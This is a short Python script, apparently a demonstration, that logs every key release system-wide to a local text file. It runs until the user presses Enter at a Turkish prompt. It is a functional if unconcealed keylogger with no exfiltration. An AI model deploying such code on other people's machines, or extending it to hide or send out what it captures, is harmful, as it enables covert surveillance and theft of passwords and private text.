import os
import keyboard

log_directory = "./logs"
log_file = "keystroke_log.txt"

if not os.path.exists(log_directory):
    os.makedirs(log_directory)

log_path = os.path.join(log_directory, log_file)

def on_key_event(event):
    with open(log_path, "a") as f:
        f.write(f"{event.name} pressed at {event.time}\n")

keyboard.on_release(on_key_event)

input("Programı sonlandırmak için Enter tuşuna basın...")